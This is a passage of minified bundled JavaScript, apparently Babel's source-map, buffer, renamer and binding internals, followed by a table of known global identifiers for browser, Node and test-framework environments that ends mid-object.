fs.GenMapping({sourceRoot:t.sourceRoot});if(this._sourceFileName=(n=t.sourceFileName)==null?void 0:n.replace(/\\\\/g,\"/\"),this._rawMappings=void 0,t.inputSourceMap){this._inputMap=new bm.TraceMap(t.inputSourceMap);let a=this._inputMap.resolvedSources;if(a.length)for(let o=0;o<a.length;o++){var i;(0,fs.setSourceContent)(s,a[o],(i=this._inputMap.sourcesContent)==null?void 0:i[o])}}if(typeof r==\"string\"&&!t.inputSourceMap)(0,fs.setSourceContent)(s,this._sourceFileName,r);else if(typeof r==\"object\")for(let a of Object.keys(r))(0,fs.setSourceContent)(s,a.replace(/\\\\/g,\"/\"),r[a])}get(){return(0,fs.toEncodedMap)(this._map)}getDecoded(){return(0,fs.toDecodedMap)(this._map)}getRawMappings(){return this._rawMappings||(this._rawMappings=(0,fs.allMappings)(this._map))}mark(t,r,n,s,i,a){var o;this._rawMappings=void 0;let l;if(r!=null)if(this._inputMap){if(l=(0,bm.originalPositionFor)(this._inputMap,{line:r,column:n}),!l.name&&i){let u=(0,bm.originalPositionFor)(this._inputMap,i);u.name&&(s=u.name)}}else l={source:(a==null?void 0:a.replace(/\\\\/g,\"/\"))||this._sourceFileName,line:r,column:n};(0,fs.maybeAddMapping)(this._map,{name:s,generated:t,source:(o=l)==null?void 0:o.source,original:l})}};Eu.default=Em});var jS=E(vu=>{\"use strict\";Object.defineProperty(vu,\"__esModule\",{value:!0});vu.default=void 0;var vm=class{constructor(t,r){this._map=null,this._buf=\"\",this._str=\"\",this._appendCount=0,this._last=0,this._queue=[],this._queueCursor=0,this._canMarkIdName=!0,this._indentChar=\"\",this._fastIndentations=[],this._position={line:1,column:0},this._sourcePosition={identifierName:void 0,identifierNamePos:void 0,line:void 0,column:void 0,filename:void 0},this._map=t,this._indentChar=r;for(let n=0;n<64;n++)this._fastIndentations.push(r.repeat(n));this._allocQueue()}_allocQueue(){let t=this._queue;for(let r=0;r<16;r++)t.push({char:0,repeat:1,line:void 0,column:void 0,identifierName:void 0,identifierNamePos:void 0,filename:\"\"})}_pushQueue(t,r,n,s,i){let a=this._queueCursor;a===this._queue.length&&this._allocQueue();let o=this._queue[a];o.char=t,o.repeat=r,o.line=n,o.column=s,o.filename=i,this._queueCursor++}_popQueue(){if(this._queueCursor===0)throw new Error(\"Cannot pop from empty queue\");return this._queue[--this._queueCursor]}get(){this._flush();let t=this._map,r={code:(this._buf+this._str).trimRight(),decodedMap:t==null?void 0:t.getDecoded(),get __mergedMap(){return this.map},get map(){let n=t?t.get():null;return r.map=n,n},set map(n){Object.defineProperty(r,\"map\",{value:n,writable:!0})},get rawMappings(){let n=t==null?void 0:t.getRawMappings();return r.rawMappings=n,n},set rawMappings(n){Object.defineProperty(r,\"rawMappings\",{value",
                    "rendered": {
                      "text": "sm,exportNamedDeclaration:cS,exportSpecifier:fS,identifier:im,variableDeclaration:nY,variableDeclarator:sY}=rY;function iY(e){if(!e.isExportDeclaration()||e.isExportAllDeclaration())throw new Error(\"Only default and named export declarations can be split.\");if(e.isExportDefaultDeclaration()){let i=e.get(\"declaration\"),a=i.isFunctionDeclaration()||i.isClassDeclaration(),o=i.isFunctionExpression()||i.isClassExpression(),l=i.isScope()?i.scope.parent:i.scope,u=i.node.id,c=!1;u?o&&l.hasBinding(u.name)&&(c=!0,u=l.generateUidIdentifier(u.name)):(c=!0,u=l.generateUidIdentifier(\"default\"),(a||o)&&(i.node.id=sm(u)));let f=a?i.node:nY(\"var\",[sY(sm(u),i.node)]),p=cS(null,[fS(sm(u),im(\"default\"))]);return e.insertAfter(p),e.replaceWith(f),c&&l.registerDeclaration(e),e}else if(e.get(\"specifiers\").length>0)throw new Error(\"It doesn't make sense to split exported specifiers.\");let t=e.get(\"declaration\"),r=t.getOuterBindingIdentifiers(),n=Object.keys(r).map(i=>fS(im(i),im(i))),s=cS(null,n);return e.insertAfter(s),e.replaceWith(t.node),e}});var cs=E(Ri=>{\"use strict\";Object.defineProperty(Ri,\"__esModule\",{value:!0});Ri.default=void 0;Ri.requeueComputedKeyAndDecorators=om;Ri.skipAllButComputedKey=function(t){t.skip(),t.node.computed&&t.context.maybeQueue(t.get(\"key\"))};function om(e){let{context:t,node:r}=e;if(r.computed&&t.maybeQueue(e.get(\"key\")),r.decorators)for(let n of e.get(\"decorators\"))t.maybeQueue(n)}var aY={FunctionParent(e){e.isArrowFunctionExpression()||(e.skip(),e.isMethod()&&om(e))},Property(e){e.isObjectProperty()||(e.skip(),om(e))}},oY=aY;Ri.default=oY});var pS=E(uu=>{\"use strict\";Object.defineProperty(uu,\"__esModule\",{value:!0});uu.default=void 0;var lY=no(),uY=De(),cY=cs(),fY=cu(),pY=ro(),dY={ReferencedIdentifier({node:e},t){e.name===t.oldName&&(e.name=t.newName)},Scope(e,t){e.scope.bindingIdentifierEquals(t.oldName,t.binding.identifier)||(e.skip(),e.isMethod()&&(0,cY.requeueComputedKeyAndDecorators)(e))},ObjectProperty({node:e,scope:t},r){let{name:n}=e.key;if(e.shorthand&&(n===r.oldName||n===r.newName)&&t.getBindingIdentifier(n)===r.binding.identifier){var s;e.shorthand=!1,(s=e.extra)!=null&&s.shorthand&&(e.extra.shorthand=!1)}},\"AssignmentExpression|Declaration|VariableDeclarator\"(e,t){if(e.isVariableDeclaration())return;let r=e.getOuterBindingIdentifiers();for(let n in r)n===t.oldName&&(r[n].name=t.newName)}},lm=class{constructor(t,r,n){this.newName=n,this.oldName=r,this.binding=t}maybeConvertFromExportDeclaration(t){let r=t.parentPath;if(r.isExportDeclaration()){if(r.isExportDefaultDeclaration()){let{declaration:n}=r.node;if(uY.isDeclaration(n)&&!n.id)return}r.isExportAllDeclaration()||(0,lY.default)(r)}}maybeConvertFromClassFunctionDeclaration(t){return t}maybeConvertFromClassFunctionExpression(t){return t}rename(){let{binding:t,oldName:r,newName:n}=this,{scope:s,path:i}=t,a=i.find(l=>l.isDeclaration()||l.isFunctionExpression()||l.isClassExpression());a&&a.getOuterBindingIdentifiers()[r]===t.identifier&&this.maybeConvertFromExportDeclaration(a);let o=arguments[0]||s.block;(0,fY.traverseNode)(o,(0,pY.explode)(dY),s,this,s.path,{discriminant:!0}),arguments[0]||(s.removeOwnBinding(r),s.bindings[n]=t,this.binding.identifier.name=n),a&&(this.maybeConvertFromClassFunctionDeclaration(i),this.maybeConvertFromClassFunctionExpression(i))}};uu.default=lm});var dS=E(fu=>{\"use strict\";Object.defineProperty(fu,\"__esModule\",{value:!0});fu.default=void 0;var um=class{constructor({identifier:t,scope:r,path:n,kind:s}){this.identifier=void 0,this.scope=void 0,this.path=void 0,this.kind=void 0,this.constantViolations=[],this.constant=!0,this.referencePaths=[],this.referenced=!1,this.references=0,this.identifier=t,this.scope=r,this.path=n,this.kind=s,(s===\"var\"||s===\"hoisted\")&&hY(n)&&this.reassign(n),this.clearValue()}deoptValue(){this.clearValue(),this.hasDeoptedValue=!0}setValue(t){this.hasDeoptedValue||(this.hasValue=!0,this.value=t)}clearValue(){this.hasDeoptedValue=!1,this.hasValue=!1,this.value=null}reassign(t){this.constant=!1,this.constantViolations.indexOf(t)===-1&&this.constantViolations.push(t)}reference(t){this.referencePaths.indexOf(t)===-1&&(this.referenced=!0,this.references++,this.referencePaths.push(t))}dereference(){this.references--,this.referenced=!!this.references}};fu.default=um;function hY(e){for(let{parentPath:t,key:r}=e;t;{parentPath:t,key:r}=t){if(t.isFunctionParent())return!1;if(t.isWhile()||t.isForXStatement()||t.isForStatement()&&r===\"body\")return!0}return!1}});var hS=E((SCe,mY)=>{mY.exports={builtin:{Array:!1,ArrayBuffer:!1,Atomics:!1,BigInt:!1,BigInt64Array:!1,BigUint64Array:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,globalThis:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es5:{Array:!1,Boolean:!1,constructor:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,propertyIsEnumerable:!1,RangeError:!1,ReferenceError:!1,RegExp:!1,String:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1},es2015:{Array:!1,ArrayBuffer:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},es2017:{Array:!1,ArrayBuffer:!1,Atomics:!1,Boolean:!1,constructor:!1,DataView:!1,Date:!1,decodeURI:!1,decodeURIComponent:!1,encodeURI:!1,encodeURIComponent:!1,Error:!1,escape:!1,eval:!1,EvalError:!1,Float32Array:!1,Float64Array:!1,Function:!1,hasOwnProperty:!1,Infinity:!1,Int16Array:!1,Int32Array:!1,Int8Array:!1,isFinite:!1,isNaN:!1,isPrototypeOf:!1,JSON:!1,Map:!1,Math:!1,NaN:!1,Number:!1,Object:!1,parseFloat:!1,parseInt:!1,Promise:!1,propertyIsEnumerable:!1,Proxy:!1,RangeError:!1,ReferenceError:!1,Reflect:!1,RegExp:!1,Set:!1,SharedArrayBuffer:!1,String:!1,Symbol:!1,SyntaxError:!1,toLocaleString:!1,toString:!1,TypeError:!1,Uint16Array:!1,Uint32Array:!1,Uint8Array:!1,Uint8ClampedArray:!1,undefined:!1,unescape:!1,URIError:!1,valueOf:!1,WeakMap:!1,WeakSet:!1},browser:{AbortController:!1,AbortSignal:!1,addEventListener:!1,alert:!1,AnalyserNode:!1,Animation:!1,AnimationEffectReadOnly:!1,AnimationEffectTiming:!1,AnimationEffectTimingReadOnly:!1,AnimationEvent:!1,AnimationPlaybackEvent:!1,AnimationTimeline:!1,applicationCache:!1,ApplicationCache:!1,ApplicationCacheErrorEvent:!1,atob:!1,Attr:!1,Audio:!1,AudioBuffer:!1,AudioBufferSourceNode:!1,AudioContext:!1,AudioDestinationNode:!1,AudioListener:!1,AudioNode:!1,AudioParam:!1,AudioProcessingEvent:!1,AudioScheduledSourceNode:!1,\"AudioWorkletGlobalScope \":!1,AudioWorkletNode:!1,AudioWorkletProcessor:!1,BarProp:!1,BaseAudioContext:!1,BatteryManager:!1,BeforeUnloadEvent:!1,BiquadFilterNode:!1,Blob:!1,BlobEvent:!1,blur:!1,BroadcastChannel:!1,btoa:!1,BudgetService:!1,ByteLengthQueuingStrategy:!1,Cache:!1,caches:!1,CacheStorage:!1,cancelAnimationFrame:!1,cancelIdleCallback:!1,CanvasCaptureMediaStreamTrack:!1,CanvasGradient:!1,CanvasPattern:!1,CanvasRenderingContext2D:!1,ChannelMergerNode:!1,ChannelSplitterNode:!1,CharacterData:!1,clearInterval:!1,clearTimeout:!1,clientInformation:!1,ClipboardEvent:!1,close:!1,closed:!1,CloseEvent:!1,Comment:!1,CompositionEvent:!1,confirm:!1,console:!1,ConstantSourceNode:!1,ConvolverNode:!1,CountQueuingStrategy:!1,createImageBitmap:!1,Credential:!1,CredentialsContainer:!1,crypto:!1,Crypto:!1,CryptoKey:!1,CSS:!1,CSSConditionRule:!1,CSSFontFaceRule:!1,CSSGroupingRule:!1,CSSImportRule:!1,CSSKeyframeRule:!1,CSSKeyframesRule:!1,CSSMediaRule:!1,CSSNamespaceRule:!1,CSSPageRule:!1,CSSRule:!1,CSSRuleList:!1,CSSStyleDeclaration:!1,CSSStyleRule:!1,CSSStyleSheet:!1,CSSSupportsRule:!1,CustomElementRegistry:!1,customElements:!1,CustomEvent:!1,DataTransfer:!1,DataTransferItem:!1,DataTransferItemList:!1,defaultstatus:!1,defaultStatus:!1,DelayNode:!1,DeviceMotionEvent:!1,DeviceOrientationEvent:!1,devicePixelRatio:!1,dispatchEvent:!1,document:!1,Document:!1,DocumentFragment:!1,DocumentType:!1,DOMError:!1,DOMException:!1,DOMImplementation:!1,DOMMatrix:!1,DOMMatrixReadOnly:!1,DOMParser:!1,DOMPoint:!1,DOMPointReadOnly:!1,DOMQuad:!1,DOMRect:!1,DOMRectReadOnly:!1,DOMStringList:!1,DOMStringMap:!1,DOMTokenList:!1,DragEvent:!1,DynamicsCompressorNode:!1,Element:!1,ErrorEvent:!1,event:!1,Event:!1,EventSource:!1,EventTarget:!1,external:!1,fetch:!1,File:!1,FileList:!1,FileReader:!1,find:!1,focus:!1,FocusEvent:!1,FontFace:!1,FontFaceSetLoadEvent:!1,FormData:!1,frameElement:!1,frames:!1,GainNode:!1,Gamepad:!1,GamepadButton:!1,GamepadEvent:!1,getComputedStyle:!1,getSelection:!1,HashChangeEvent:!1,Headers:!1,history:!1,History:!1,HTMLAllCollection:!1,HTMLAnchorElement:!1,HTMLAreaElement:!1,HTMLAudioElement:!1,HTMLBaseElement:!1,HTMLBodyElement:!1,HTMLBRElement:!1,HTMLButtonElement:!1,HTMLCanvasElement:!1,HTMLCollection:!1,HTMLContentElement:!1,HTMLDataElement:!1,HTMLDataListElement:!1,HTMLDetailsElement:!1,HTMLDialogElement:!1,HTMLDirectoryElement:!1,HTMLDivElement:!1,HTMLDListElement:!1,HTMLDocument:!1,HTMLElement:!1,HTMLEmbedElement:!1,HTMLFieldSetElement:!1,HTMLFontElement:!1,HTMLFormControlsCollection:!1,HTMLFormElement:!1,HTMLFrameElement:!1,HTMLFrameSetElement:!1,HTMLHeadElement:!1,HTMLHeadingElement:!1,HTMLHRElement:!1,HTMLHtmlElement:!1,HTMLIFrameElement:!1,HTMLImageElement:!1,HTMLInputElement:!1,HTMLLabelElement:!1,HTMLLegendElement:!1,HTMLLIElement:!1,HTMLLinkElement:!1,HTMLMapElement:!1,HTMLMarqueeElement:!1,HTMLMediaElement:!1,HTMLMenuElement:!1,HTMLMetaElement:!1,HTMLMeterElement:!1,HTMLModElement:!1,HTMLObjectElement:!1,HTMLOListElement:!1,HTMLOptGroupElement:!1,HTMLOptionElement:!1,HTMLOptionsCollection:!1,HTMLOutputElement:!1,HTMLParagraphElement:!1,HTMLParamElement:!1,HTMLPictureElement:!1,HTMLPreElement:!1,HTMLProgressElement:!1,HTMLQuoteElement:!1,HTMLScriptElement:!1,HTMLSelectElement:!1,HTMLShadowElement:!1,HTMLSlotElement:!1,HTMLSourceElement:!1,HTMLSpanElement:!1,HTMLStyleElement:!1,HTMLTableCaptionElement:!1,HTMLTableCellElement:!1,HTMLTableColElement:!1,HTMLTableElement:!1,HTMLTableRowElement:!1,HTMLTableSectionElement:!1,HTMLTemplateElement:!1,HTMLTextAreaElement:!1,HTMLTimeElement:!1,HTMLTitleElement:!1,HTMLTrackElement:!1,HTMLUListElement:!1,HTMLUnknownElement:!1,HTMLVideoElement:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,IdleDeadline:!1,IIRFilterNode:!1,Image:!1,ImageBitmap:!1,ImageBitmapRenderingContext:!1,ImageCapture:!1,ImageData:!1,indexedDB:!1,innerHeight:!1,innerWidth:!1,InputEvent:!1,IntersectionObserver:!1,IntersectionObserverEntry:!1,Intl:!1,isSecureContext:!1,KeyboardEvent:!1,KeyframeEffect:!1,KeyframeEffectReadOnly:!1,length:!1,localStorage:!1,location:!0,Location:!1,locationbar:!1,matchMedia:!1,MediaDeviceInfo:!1,MediaDevices:!1,MediaElementAudioSourceNode:!1,MediaEncryptedEvent:!1,MediaError:!1,MediaKeyMessageEvent:!1,MediaKeySession:!1,MediaKeyStatusMap:!1,MediaKeySystemAccess:!1,MediaList:!1,MediaQueryList:!1,MediaQueryListEvent:!1,MediaRecorder:!1,MediaSettingsRange:!1,MediaSource:!1,MediaStream:!1,MediaStreamAudioDestinationNode:!1,MediaStreamAudioSourceNode:!1,MediaStreamEvent:!1,MediaStreamTrack:!1,MediaStreamTrackEvent:!1,menubar:!1,MessageChannel:!1,MessageEvent:!1,MessagePort:!1,MIDIAccess:!1,MIDIConnectionEvent:!1,MIDIInput:!1,MIDIInputMap:!1,MIDIMessageEvent:!1,MIDIOutput:!1,MIDIOutputMap:!1,MIDIPort:!1,MimeType:!1,MimeTypeArray:!1,MouseEvent:!1,moveBy:!1,moveTo:!1,MutationEvent:!1,MutationObserver:!1,MutationRecord:!1,name:!1,NamedNodeMap:!1,NavigationPreloadManager:!1,navigator:!1,Navigator:!1,NetworkInformation:!1,Node:!1,NodeFilter:!1,NodeIterator:!1,NodeList:!1,Notification:!1,OfflineAudioCompletionEvent:!1,OfflineAudioContext:!1,offscreenBuffering:!1,OffscreenCanvas:!0,onabort:!0,onafterprint:!0,onanimationend:!0,onanimationiteration:!0,onanimationstart:!0,onappinstalled:!0,onauxclick:!0,onbeforeinstallprompt:!0,onbeforeprint:!0,onbeforeunload:!0,onblur:!0,oncancel:!0,oncanplay:!0,oncanplaythrough:!0,onchange:!0,onclick:!0,onclose:!0,oncontextmenu:!0,oncuechange:!0,ondblclick:!0,ondevicemotion:!0,ondeviceorientation:!0,ondeviceorientationabsolute:!0,ondrag:!0,ondragend:!0,ondragenter:!0,ondragleave:!0,ondragover:!0,ondragstart:!0,ondrop:!0,ondurationchange:!0,onemptied:!0,onended:!0,onerror:!0,onfocus:!0,ongotpointercapture:!0,onhashchange:!0,oninput:!0,oninvalid:!0,onkeydown:!0,onkeypress:!0,onkeyup:!0,onlanguagechange:!0,onload:!0,onloadeddata:!0,onloadedmetadata:!0,onloadstart:!0,onlostpointercapture:!0,onmessage:!0,onmessageerror:!0,onmousedown:!0,onmouseenter:!0,onmouseleave:!0,onmousemove:!0,onmouseout:!0,onmouseover:!0,onmouseup:!0,onmousewheel:!0,onoffline:!0,ononline:!0,onpagehide:!0,onpageshow:!0,onpause:!0,onplay:!0,onplaying:!0,onpointercancel:!0,onpointerdown:!0,onpointerenter:!0,onpointerleave:!0,onpointermove:!0,onpointerout:!0,onpointerover:!0,onpointerup:!0,onpopstate:!0,onprogress:!0,onratechange:!0,onrejectionhandled:!0,onreset:!0,onresize:!0,onscroll:!0,onsearch:!0,onseeked:!0,onseeking:!0,onselect:!0,onstalled:!0,onstorage:!0,onsubmit:!0,onsuspend:!0,ontimeupdate:!0,ontoggle:!0,ontransitionend:!0,onunhandledrejection:!0,onunload:!0,onvolumechange:!0,onwaiting:!0,onwheel:!0,open:!1,openDatabase:!1,opener:!1,Option:!1,origin:!1,OscillatorNode:!1,outerHeight:!1,outerWidth:!1,PageTransitionEvent:!1,pageXOffset:!1,pageYOffset:!1,PannerNode:!1,parent:!1,Path2D:!1,PaymentAddress:!1,PaymentRequest:!1,PaymentRequestUpdateEvent:!1,PaymentResponse:!1,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceLongTaskTiming:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceNavigationTiming:!1,PerformanceObserver:!1,PerformanceObserverEntryList:!1,PerformancePaintTiming:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,PeriodicWave:!1,Permissions:!1,PermissionStatus:!1,personalbar:!1,PhotoCapabilities:!1,Plugin:!1,PluginArray:!1,PointerEvent:!1,PopStateEvent:!1,postMessage:!1,Presentation:!1,PresentationAvailability:!1,PresentationConnection:!1,PresentationConnectionAvailableEvent:!1,PresentationConnectionCloseEvent:!1,PresentationConnectionList:!1,PresentationReceiver:!1,PresentationRequest:!1,print:!1,ProcessingInstruction:!1,ProgressEvent:!1,PromiseRejectionEvent:!1,prompt:!1,PushManager:!1,PushSubscription:!1,PushSubscriptionOptions:!1,queueMicrotask:!1,RadioNodeList:!1,Range:!1,ReadableStream:!1,registerProcessor:!1,RemotePlayback:!1,removeEventListener:!1,Request:!1,requestAnimationFrame:!1,requestIdleCallback:!1,resizeBy:!1,ResizeObserver:!1,ResizeObserverEntry:!1,resizeTo:!1,Response:!1,RTCCertificate:!1,RTCDataChannel:!1,RTCDataChannelEvent:!1,RTCDtlsTransport:!1,RTCIceCandidate:!1,RTCIceGatherer:!1,RTCIceTransport:!1,RTCPeerConnection:!1,RTCPeerConnectionIceEvent:!1,RTCRtpContributingSource:!1,RTCRtpReceiver:!1,RTCRtpSender:!1,RTCSctpTransport:!1,RTCSessionDescription:!1,RTCStatsReport:!1,RTCTrackEvent:!1,screen:!1,Screen:!1,screenLeft:!1,ScreenOrientation:!1,screenTop:!1,screenX:!1,screenY:!1,ScriptProcessorNode:!1,scroll:!1,scrollbars:!1,scrollBy:!1,scrollTo:!1,scrollX:!1,scrollY:!1,SecurityPolicyViolationEvent:!1,Selection:!1,self:!1,ServiceWorker:!1,ServiceWorkerContainer:!1,ServiceWorkerRegistration:!1,sessionStorage:!1,setInterval:!1,setTimeout:!1,ShadowRoot:!1,SharedWorker:!1,SourceBuffer:!1,SourceBufferList:!1,speechSynthesis:!1,SpeechSynthesisEvent:!1,SpeechSynthesisUtterance:!1,StaticRange:!1,status:!1,statusbar:!1,StereoPannerNode:!1,stop:!1,Storage:!1,StorageEvent:!1,StorageManager:!1,styleMedia:!1,StyleSheet:!1,StyleSheetList:!1,SubtleCrypto:!1,SVGAElement:!1,SVGAngle:!1,SVGAnimatedAngle:!1,SVGAnimatedBoolean:!1,SVGAnimatedEnumeration:!1,SVGAnimatedInteger:!1,SVGAnimatedLength:!1,SVGAnimatedLengthList:!1,SVGAnimatedNumber:!1,SVGAnimatedNumberList:!1,SVGAnimatedPreserveAspectRatio:!1,SVGAnimatedRect:!1,SVGAnimatedString:!1,SVGAnimatedTransformList:!1,SVGAnimateElement:!1,SVGAnimateMotionElement:!1,SVGAnimateTransformElement:!1,SVGAnimationElement:!1,SVGCircleElement:!1,SVGClipPathElement:!1,SVGComponentTransferFunctionElement:!1,SVGDefsElement:!1,SVGDescElement:!1,SVGDiscardElement:!1,SVGElement:!1,SVGEllipseElement:!1,SVGFEBlendElement:!1,SVGFEColorMatrixElement:!1,SVGFEComponentTransferElement:!1,SVGFECompositeElement:!1,SVGFEConvolveMatrixElement:!1,SVGFEDiffuseLightingElement:!1,SVGFEDisplacementMapElement:!1,SVGFEDistantLightElement:!1,SVGFEDropShadowElement:!1,SVGFEFloodElement:!1,SVGFEFuncAElement:!1,SVGFEFuncBElement:!1,SVGFEFuncGElement:!1,SVGFEFuncRElement:!1,SVGFEGaussianBlurElement:!1,SVGFEImageElement:!1,SVGFEMergeElement:!1,SVGFEMergeNodeElement:!1,SVGFEMorphologyElement:!1,SVGFEOffsetElement:!1,SVGFEPointLightElement:!1,SVGFESpecularLightingElement:!1,SVGFESpotLightElement:!1,SVGFETileElement:!1,SVGFETurbulenceElement:!1,SVGFilterElement:!1,SVGForeignObjectElement:!1,SVGGElement:!1,SVGGeometryElement:!1,SVGGradientElement:!1,SVGGraphicsElement:!1,SVGImageElement:!1,SVGLength:!1,SVGLengthList:!1,SVGLinearGradientElement:!1,SVGLineElement:!1,SVGMarkerElement:!1,SVGMaskElement:!1,SVGMatrix:!1,SVGMetadataElement:!1,SVGMPathElement:!1,SVGNumber:!1,SVGNumberList:!1,SVGPathElement:!1,SVGPatternElement:!1,SVGPoint:!1,SVGPointList:!1,SVGPolygonElement:!1,SVGPolylineElement:!1,SVGPreserveAspectRatio:!1,SVGRadialGradientElement:!1,SVGRect:!1,SVGRectElement:!1,SVGScriptElement:!1,SVGSetElement:!1,SVGStopElement:!1,SVGStringList:!1,SVGStyleElement:!1,SVGSVGElement:!1,SVGSwitchElement:!1,SVGSymbolElement:!1,SVGTextContentElement:!1,SVGTextElement:!1,SVGTextPathElement:!1,SVGTextPositioningElement:!1,SVGTitleElement:!1,SVGTransform:!1,SVGTransformList:!1,SVGTSpanElement:!1,SVGUnitTypes:!1,SVGUseElement:!1,SVGViewElement:!1,TaskAttributionTiming:!1,Text:!1,TextDecoder:!1,TextEncoder:!1,TextEvent:!1,TextMetrics:!1,TextTrack:!1,TextTrackCue:!1,TextTrackCueList:!1,TextTrackList:!1,TimeRanges:!1,toolbar:!1,top:!1,Touch:!1,TouchEvent:!1,TouchList:!1,TrackEvent:!1,TransitionEvent:!1,TreeWalker:!1,UIEvent:!1,URL:!1,URLSearchParams:!1,ValidityState:!1,visualViewport:!1,VisualViewport:!1,VTTCue:!1,WaveShaperNode:!1,WebAssembly:!1,WebGL2RenderingContext:!1,WebGLActiveInfo:!1,WebGLBuffer:!1,WebGLContextEvent:!1,WebGLFramebuffer:!1,WebGLProgram:!1,WebGLQuery:!1,WebGLRenderbuffer:!1,WebGLRenderingContext:!1,WebGLSampler:!1,WebGLShader:!1,WebGLShaderPrecisionFormat:!1,WebGLSync:!1,WebGLTexture:!1,WebGLTransformFeedback:!1,WebGLUniformLocation:!1,WebGLVertexArrayObject:!1,WebSocket:!1,WheelEvent:!1,window:!1,Window:!1,Worker:!1,WritableStream:!1,XMLDocument:!1,XMLHttpRequest:!1,XMLHttpRequestEventTarget:!1,XMLHttpRequestUpload:!1,XMLSerializer:!1,XPathEvaluator:!1,XPathExpression:!1,XPathResult:!1,XSLTProcessor:!1},worker:{addEventListener:!1,applicationCache:!1,atob:!1,Blob:!1,BroadcastChannel:!1,btoa:!1,Cache:!1,caches:!1,clearInterval:!1,clearTimeout:!1,close:!0,console:!1,fetch:!1,FileReaderSync:!1,FormData:!1,Headers:!1,IDBCursor:!1,IDBCursorWithValue:!1,IDBDatabase:!1,IDBFactory:!1,IDBIndex:!1,IDBKeyRange:!1,IDBObjectStore:!1,IDBOpenDBRequest:!1,IDBRequest:!1,IDBTransaction:!1,IDBVersionChangeEvent:!1,ImageData:!1,importScripts:!0,indexedDB:!1,location:!1,MessageChannel:!1,MessagePort:!1,name:!1,navigator:!1,Notification:!1,onclose:!0,onconnect:!0,onerror:!0,onlanguagechange:!0,onmessage:!0,onoffline:!0,ononline:!0,onrejectionhandled:!0,onunhandledrejection:!0,performance:!1,Performance:!1,PerformanceEntry:!1,PerformanceMark:!1,PerformanceMeasure:!1,PerformanceNavigation:!1,PerformanceResourceTiming:!1,PerformanceTiming:!1,postMessage:!0,Promise:!1,queueMicrotask:!1,removeEventListener:!1,Request:!1,Response:!1,self:!0,ServiceWorkerRegistration:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1,WebSocket:!1,Worker:!1,WorkerGlobalScope:!1,XMLHttpRequest:!1},node:{__dirname:!1,__filename:!1,Buffer:!1,clearImmediate:!1,clearInterval:!1,clearTimeout:!1,console:!1,exports:!0,global:!1,Intl:!1,module:!1,process:!1,queueMicrotask:!1,require:!1,setImmediate:!1,setInterval:!1,setTimeout:!1,TextDecoder:!1,TextEncoder:!1,URL:!1,URLSearchParams:!1},commonjs:{exports:!0,global:!1,module:!1,require:!1},amd:{define:!1,require:!1},mocha:{after:!1,afterEach:!1,before:!1,beforeEach:!1,context:!1,describe:!1,it:!1,mocha:!1,run:!1,setup:!1,specify:!1,suite:!1,suiteSetup:!1,suiteTeardown:!1,teardown:!1,test:!1,xcontext:!1,xdescribe:!1,xit:!1,xspecify:!1},jasmine:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fail:!1,fdescribe:!1,fit:!1,it:!1,jasmine:!1,pending:!1,runs:!1,spyOn:!1,spyOnProperty:!1,waits:!1,waitsFor:!1,xdescribe:!1,xit:!1},jest:{afterAll:!1,afterEach:!1,beforeAll:!1,beforeEach:!1,describe:!1,expect:!1,fdescribe:!1,fit:!1,it:!1,jest:!1,pit:!1,require:!1,test:!1,xdescribe:!1,xit:!1,xtest:!1},qunit:{asyncTest:!1,deepEqual:!1,equal:!1,expect:!1,module:!1,notDeepEqual:!1,notEqual:!1,notOk:!1,notPropEqual:!1,notStrictEqual:!1,ok:!1,propEqual:!1,QUnit:!1,raises:!1,start:!1,stop:!1,strictEqual:!1,test:!1,throws:!1},phantomjs:{console:!0,exports:!0,phantom:!0,require:!0,WebPage:!0},couch:{emit:!1,exports:!1,getRow:!1,log:!1,module:!1,provides:!1,require:!1,respond